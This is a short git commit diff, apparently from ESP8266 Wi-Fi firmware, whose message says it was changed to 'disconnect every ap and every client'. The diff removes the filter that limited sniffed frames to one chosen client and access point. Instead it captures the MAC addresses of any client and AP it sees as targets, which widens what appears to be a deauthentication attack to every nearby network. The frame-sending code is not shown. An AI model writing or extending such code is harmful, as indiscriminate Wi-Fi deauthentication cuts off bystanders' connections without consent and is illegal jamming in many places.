739bddb30ba47880aa397b999727971bf272c93d
wouters <wouters@wouters>
2016-01-14 19:43:56 +0100

    changed it to disconnect every ap and every client

--- user/user_main.c
+++ user/user_main.c
@@ -132,8 +132,12 @@ promisc_cb(uint8_t *buf, uint16_t len)
         struct sniffer_buf *sniffer = (struct sniffer_buf*) buf;
         int i=0;
         // Check MACs
-        for (i=0; i<6; i++) if (sniffer->buf[i+4] != client[i]) return;
-        for (i=0; i<6; i++) if (sniffer->buf[i+10] != ap[i]) return;
+       for (i=0; i<6; i++) {
+        	client[i] = sniffer->buf[i+4];
+        }
+        for (i=0; i<6; i++) {
+			ap[i] = sniffer->buf[i+10];
+		}
         // Update sequence number
         seq_n = sniffer->buf[23] * 0xFF + sniffer->buf[22];
     }
